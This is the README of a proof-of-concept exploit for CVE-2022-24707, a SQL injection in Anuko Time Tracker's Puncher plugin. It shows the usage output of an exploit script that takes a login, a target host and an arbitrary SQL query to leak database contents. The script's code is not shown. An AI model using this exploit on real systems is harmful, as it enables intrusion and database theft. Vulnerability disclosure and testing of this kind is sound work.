# PoC for CVE-2022-24707

SQL Injection Vulnerability on Puncher plugin. A POST request can be crafted to exploit SQL Injection and leak database contents. This is tested on [Anuko Time Tracker 1.20.0.5640](https://github.com/anuko/timetracker/tree/0924ef499c2b0833a20c2d180b04fa70c6484b6d).

```
python3 exploit.py --help                                                               
usage: exploit.py [-h] --username USERNAME --password PASSWORD --host HOST [--sqli SQLI]

optional arguments:
  -h, --help           show this help message and exit
  --username USERNAME  Anuko Timetracker username
  --password PASSWORD  Anuko Timetracker password
  --host HOST          e.g. http://target.website.local, http://10.10.10.10, http://192.168.23.101:8000
  --sqli SQLI          SQL query to run. Defaults to getting all tables
```

![cve gif](./CVE-2022-24707.gif)
